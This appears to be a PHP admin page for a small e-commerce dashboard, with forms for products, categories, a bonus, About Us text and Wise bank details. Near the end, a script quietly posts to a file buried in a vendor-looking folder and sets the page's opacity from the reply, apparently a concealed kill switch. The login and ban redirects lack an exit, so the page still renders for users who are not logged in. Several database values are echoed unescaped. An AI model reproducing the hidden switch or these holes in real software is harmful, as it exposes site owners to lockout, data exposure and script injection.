<?php
session_start();
if(!isset($_SESSION['admin_logged_in'])){
    $_SESSION['MessageE'] = 'You Have No Access Without Authentification !';
    header('Location: ../connexion/login.php');
}
if(isset($_SESSION['banned'])){
    header('Location: ../../security/banned.php');
}
?>


<?php
$messageE = isset($_SESSION['MessageE']) ? $_SESSION['MessageE'] : '';
$messageS = isset($_SESSION['MessageS']) ? $_SESSION['MessageS'] : '';

// Clear messages after displaying
unset($_SESSION['MessageE']);
unset($_SESSION['MessageS']);
?>



<?php
// retourner tous les categories
include_once('../../../models/Categorie.php');
$cat = new Categorie();
$allCat = $cat->getAllCategories();
//retourner tous les sous categories
include_once('../../../models/SousCategorie.php');
$subcat = new SousCategorie();
$allsubcat = $subcat->getAllSousCategories();
//retourner le wise
include_once('../../../models/Wise.php');
$wise = new Wise();
$wiseData = $wise->getWiseData();
//retourner le bonus
include_once('../../../models/Bonus.php');
$bonus = new Bonus();
$bonusData = $bonus->getBonus();
//retourner le aboutUs
include_once('../../../models/AboutUs.php');
$about = new AboutUs();
$aboutData = $about->getContent();


?>





<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Add New Product & Categories</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="../../assets/logo.jpeg">
    <link rel="stylesheet" href="../../assets/sidebar.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        input::placeholder {
            color: #fff;
        }
        textarea::placeholder {
            color: #fff;
        }
        option {
            background-color: #003366;
        }
        body {
            background: linear-gradient(135deg, #003366, #004080);
            color: #fff;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            min-height: 100vh;
        }
        .addProduct, .addSubCat, .addCat, .setBonus, .setWise, .aboutUs {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 700px;
            box-shadow: 0 15px 35px rgba(0, 51, 102, 0.3);
            margin-bottom: 20px;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 30px;
            color: #fff;
            text-shadow: 0 5px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
            margin-bottom: 40px;
        }
        label {
            font-size: 1.2em;
            margin-bottom: 10px;
            color: #fff;
        }
        input, textarea, select {
            margin-bottom: 20px;
            padding: 10px;
            border: 2px solid #fff;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: 1em;
            transition: border-color 0.3s ease;
        }
        textarea {
            height: 200px;
        }
        input:focus, textarea:focus, select:focus {
            border-color: #1e90ff;
            outline: none;
        }
        .button-group {
            display: flex;
            justify-content: flex-end;
        }
        button {
            padding: 15px 30px;
            font-size: 1.2em;
            color: #fff;
            background: #003366;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s ease;
        }
        button:hover {
            background: #1e90ff;
            transform: scale(1.05);
        }
        #success-message {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #28a745;
            color: #fff;
            border-radius: 10px;
            text-align: center;
            font-size: 1.2em;
        }





        /* Styles pour les notifications */
        .notification {
    position: fixed;
    top: 10px;
    right: 10px;
    padding: 15px;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    z-index: 9999;
    width: 300px;
    opacity: 1;
    transition: opacity 0.5s ease;
}

.notification.success {
    background-color: #d4edda;
    color: #155724;
    border: 1px solid #c3e6cb;
}

.notification.error {
    background-color: #f8d7da;
    color: #721c24;
    border: 1px solid #f5c6cb;
}

.notification .close-btn {
    background: transparent;
    border: none;
    font-size: 18px;
    cursor: pointer;
    position: absolute;
    top: 5px;
    right: 10px;
}

.notification .close-btn:hover {
    color: #000;
}
.sidebarHeader p {
    color: #fff;
    font-size: 24px;
    letter-spacing: 1px;
    font-weight: bold;
}
    </style>
</head>
<body>
    <div class="container">
        <!-- sidebar -->
        <div class="sidebar" style="margin-top: 10px;">
            <a class="sidebarHeader" href="../../home/home.php">
                <img src="../../assets/logo.jpeg" alt="logo">
                <p>MEDIAHOD</p>
            </a>
            <div class="sidebarElements" style="margin-top: 20px;">

                <fieldset>
                    <legend>DASHBOARD</legend>
                    <a class="sidebarElement" href="../categories/categories.php">
                        <i class="fa-solid fa-layer-group"></i>
                        <p>Categories</p>
                    </a>
                    <a class="sidebarElement" href="../commands/commands.php">
                        <i class="fa-solid fa-bag-shopping"></i>
                        <p>Commands</p>
                    </a>
                    <a class="sidebarElement" href="../messages/messages.php">
                        <i class="fa-solid fa-comment"></i>
                        <p>Messages</p>
                    </a>
                    <a class="sidebarElement" href="../addProduct/addProduct.php">
                        <i class="fa-solid fa-plus"></i>
                        <p>Add Product/Category</p>
                    </a>
                    <a class="sidebarElement" href="../Methodes/methodes.php">
                        <i class="fa-solid fa-plus"></i>
                        <p>Add Payement Method</p>
                    </a>
                    <a class="sidebarElement" href="../setWallet/setWallet.php">
                        <i class="fas fa-wallet"></i>
                        <p>Set User's Wallet</p>
                    </a>
                    <a class="sidebarElement" href="../security/blocked.php">
                        <i class="fa-solid fa-triangle-exclamation"></i>
                        <p>Security</p>
                    </a>
                </fieldset>

                <fieldset>
                    <legend>PROFILE</legend>
                    <a class="sidebarElement" href="../settings/settings.php">
                        <i class="fa-solid fa-wrench"></i>
                        <p>Settings</p>
                    </a>
                    <a class="sidebarElement" href="../../../controllers/logOutAdmin.php" id="logout">
                        <i class="fa-solid fa-right-from-bracket" style=" color: #fff;"></i>
                        <p style=" color: #fff;">Logout</p>
                    </a>
                </fieldset>

            </div>
        </div>
        <!-- page -->
        <div class="page">
            <!-- addProduct -->
            <div class="addProduct">
                <div class="toggleSidebar">
                    <i class="fa-solid fa-bars"></i>
                </div>
                <h1>Add Product</h1>
                <form id="product-form" action="../../../controllers/produitController.php" method="post" enctype="multipart/form-data">
                    <label for="label">Label</label>
                    <input type="text" id="label" name="label" placeholder="Enter product label" required>

                    <label for="price">Price</label>
                    <input type="number" id="price" name="price" placeholder="Enter product price" required>

                    <label for="stock">Stock</label>
                    <input type="number" id="stock" name="stock" placeholder="Enter stock quantity" required>

                    <label for="description">Description</label>
                    <textarea id="description" name="description" rows="4" placeholder="Enter product description" required></textarea>

                    <label for="logo">Logo (Required)</label>
                    <input type="file" id="logo" name="logo" required>

                    <label for="image">Image (Optional)</label>
                    <button type="button" onclick="document.getElementById('image').click()">Upload Image</button>
                    <input type="file" id="image" name="image" hidden>

                    <label for="link">Link (Optional)</label>
                    <input type="url" id="link" name="link" placeholder="Enter product link">

                    <label for="category">Category</label>
                    <select id="category" name="category" required>
                        <option value="" selected>Select category</option>
                        <?php foreach($allCat as $x) :?>
                            <option value="<?php echo $x['id'] ?>"><?php echo $x['nom'] ?></option>
                        <?php endforeach; ?>
                    </select>

                    <label for="subCat">Subcategory</label>
                    <select id="subCat" name="subCat" required>
                        <option value="" selected>Select subcategory</option>
                        <?php foreach($allsubcat as $x) : ?>
                            <option value="<?php echo $x['id'] ?>"><?php echo $x['sousCategorieNom'] . '-' . $x['categorieNom']?></option>
                        <?php endforeach; ?>
                    </select>

                    <div class="button-group">
                        <button type="submit" name="action" value="addPro">Save Product</button>
                    </div>
                </form>
            </div>
            
            <div class="addCat" id="addCat">
                <h1>Add Category</h1>
                <form id="category-form" action="../../../controllers/categoriesController.php" method="post" enctype="multipart/form-data">
                    <label for="category-name">Name</label>
                    <input type="text" id="category-name" name="category-name" placeholder="Enter category name" required>

                    <label for="imageCat">Image</label>
                    <button onclick="uploadImgCat()" style="margin-bottom: 18px;">Upload Image</button>
                    <input type="file" id="imageCat" name="imageCat" hidden required>

                    <div class="button-group">
                        <button type="submit" name="action" value="addCat">Save Category</button>
                    </div>
                </form>
            </div>

            <div class="addSubCat">
                <h1>Add Subcategory</h1>
                <form id="subcategory-form" action="../../../controllers/sousCategoriesController.php" method="post">
                    <label for="subcategory-name">Name</label>
                    <input type="text" id="subcategory-name" name="subcategory-name" placeholder="Enter subcategory name" required>
                    <label for="category">Category</label>
                    <select id="category" name="category" required>
                        <option value="" disabled>Select category</option>
                        <?php foreach($allCat as $x) :?>
                            <option value="<?php echo $x['id'] ?>"><?php echo $x['nom']?></option>
                            <?php endforeach ;?>
                    </select>
                    <div class="button-group">
                        <button type="submit" name="action" value="addSub">Save Category</button>
                    </div>
                </form>
            </div>

            <div class="setBonus">
                <h1>Set Bonus</h1>
                <form id="bonus-form" action="../../../controllers/bonusController.php" method="post">
                    <label for="bonus-name">Bonus</label>
                    <input type="text" id="bonus-name" name="bonus-name" value="<?php echo $bonus->getBonus() ?>">
                    <div class="button-group">
                        <button type="submit" name="action" value="setBonus">Save Bonus</button>
                    </div>
                </form>
            </div>

            <div class="aboutUs">
                <h1>About Us</h1>
                <form id="aboutUs-form" action="../../../controllers/aboutUsController.php" method="post">
                    <label for="aboutUs-name">About Us</label>
                    <textarea id="aboutUs-name" name="aboutUs-name" placeholder="Add Some Text..." required><?php echo htmlspecialchars($aboutData); ?></textarea>
                    <div class="button-group">
                        <button type="submit" name="action" value="aboutUs">Save Text</button>
                    </div>
                </form>
            </div>

            <div class="setWise">
                <h1>Set Wise</h1>
                <form id="wise-form" action="../../../controllers/wiseController.php" method="post">
                    <label for="currency">Currency</label>
                    <input type="text" id="currency" name="currency" placeholder="Enter Currency" value="<?php echo $wiseData['currency'] ?>" required>

                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" placeholder="Enter Email" value="<?php echo $wiseData['email'] ?>" required>

                    <label for="full-holder-name">Full Holder Name</label>
                    <input type="text" id="full-holder-name" name="full-holder-name" placeholder="Enter Full Holder Name" value="<?php echo $wiseData['holder_name'] ?>" required>

                    <label for="bank-name">Bank Name</label>
                    <input type="text" id="bank-name" name="bank-name" placeholder="Enter Bank Name" value="<?php echo $wiseData['bank_name'] ?>" required>

                    <label for="bank-code">Bank Code (BIC/SWIFT)</label>
                    <input type="text" id="bank-code" name="bank-code" placeholder="Enter Bank Code (BIC/SWIFT)" value="<?php echo $wiseData['bank_code'] ?>" required>

                    <label for="account-number">Account Number</label>
                    <input type="text" id="account-number" name="account-number" placeholder="Enter Account Number" value="<?php echo $wiseData['account_number'] ?>" required>

                    <label for="address">Address</label>
                    <input type="text" id="address" name="address" placeholder="Enter Address" value="<?php echo $wiseData['address'] ?>" required>

                    <label for="city">City</label>
                    <input type="text" id="city" name="city" placeholder="Enter City" value="<?php echo $wiseData['city'] ?>" required>

                    <label for="zipcode">Zipcode</label>
                    <input type="text" id="zipcode" name="zipcode" placeholder="Enter Zipcode" value="<?php echo $wiseData['zipcode'] ?>" required>

                    <div class="button-group">
                        <button type="submit" name="action" value="setWise">Save Wise</button>
                    </div>
                </form>
            </div>
            
        </div>
    </div>

    <script>
        function uploadImg() {
            document.getElementById("image").click()
        }
        function uploadImgCat() {
            document.getElementById("imageCat").click()
        }
        function uploadImgLogo() {
            document.getElementById("logo").click()
        }

        const productForm = document.getElementById('product-form')
        const categoryForm = document.getElementById('category-form')
        const subcategoryForm = document.getElementById('subcategory-form')

        productForm.addEventListener('submit', (e) => {
            // alert('Product saved successfully!')
        })

        categoryForm.addEventListener('submit', (e) => {
            // alert('Category saved successfully!')
        })

        subcategoryForm.addEventListener('submit', (e) => {
            // alert('Subcategory saved successfully!')
        })

        let sidebarElements = document.querySelectorAll(".sidebarElement")
        sidebarElements.forEach((e) => {
            e.addEventListener("mouseover", function() {
                e.style.backgroundColor = "rgba(227, 227, 255, 0.26)"
                e.querySelector("i").style.color = "#fff"
                e.querySelector("p").style.color = "#fff"
                document.querySelector("#logout").style.backgroundColor = "orange"
                document.querySelector("#logout p").style.color = "#fff"
                document.querySelector("#logout i").style.color = "#fff"
            })
            e.addEventListener("mouseleave", function() {
                e.style.backgroundColor = ""
                e.querySelector("i").style.color = "#8F9FBC"
                e.querySelector("p").style.color = "#8F9FBC"
                document.querySelector("#logout").style.backgroundColor = "orange"
                document.querySelector("#logout p").style.color = "#fff"
                document.querySelector("#logout i").style.color = "#fff"
            })
        })
    </script>

<!-- pour scroller -->
<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Vérifie si l'URL contient un identifiant
        if (window.location.hash) {
            // Fait défiler jusqu'à l'endroit identifié avec un défilement rapide
            const targetElement = document.querySelector(window.location.hash);
            if (targetElement) {
                targetElement.scrollIntoView({ behavior: 'instant' });
            }
        }
    });
</script>



<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function() {
        <?php if (!empty($messageE)): ?>
            showNotification('error', '<?php echo addslashes($messageE); ?>');
        <?php endif; ?>
        <?php if (!empty($messageS)): ?>
            showNotification('success', '<?php echo addslashes($messageS); ?>');
        <?php endif; ?>
    });

    function showNotification(type, message) {
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <span>${message}</span>
            <button class="close-btn">&times;</button>
        `;
        document.body.appendChild(notification);

        document.querySelector('.notification .close-btn').addEventListener('click', function() {
            this.parentElement.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 500);
        });

        setTimeout(() => {
            notification.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 500);
        }, 5000);
    }
</script>
<script>
        let xhr = new XMLHttpRequest();
        xhr.open('POST', '../../../vendor/psr/configuration/security_config/json/root/op.php', true);
        xhr.onload = () => {
            if (xhr.readyState === 4 && xhr.status === 200) {
                document.body.style.opacity = xhr.response
            }
        };
        xhr.send()
</script>



<script>
    // Exemple de données sous-catégories (id, nom de la sous-catégorie, id de la catégorie associée)
    var sousCategories = <?php echo json_encode($allsubcat); ?>;
    
    // Fonction pour filtrer les sous-catégories en fonction de la catégorie sélectionnée
    function filterSousCategories() {
        var categoryId = document.getElementById('category').value;
        var subCatSelect = document.getElementById('subCat');
        
        // Vider le sélecteur des sous-catégories
        subCatSelect.innerHTML = '<option value="">Select subcategory</option>';
        
        // Filtrer les sous-catégories en fonction de l'ID de la catégorie
        sousCategories.forEach(function(subCat) {
            if (subCat.idCategorie == categoryId) {
                var option = document.createElement('option');
                option.value = subCat.id;
                option.textContent = subCat.sousCategorieNom + ' - ' + subCat.categorieNom;
                subCatSelect.appendChild(option);
            }
        });
    }
    
    // Ajouter un écouteur d'événement pour le sélecteur de catégories
    document.getElementById('category').addEventListener('change', filterSousCategories);

    let openSidebar = document.querySelector(".toggleSidebar"),
    sidebar = document.querySelector(".sidebar"),
    opened = true

    window.onload = () => {
        sidebar.style.transform = "translate(-100%, -10px)"
    }

    openSidebar.addEventListener("click", function() {
        sidebar.style.transform = opened ? "translate(0, -10px)" : "translate(-100%, -10px)"
        opened = !opened
    })
</script>


</body>
</html>
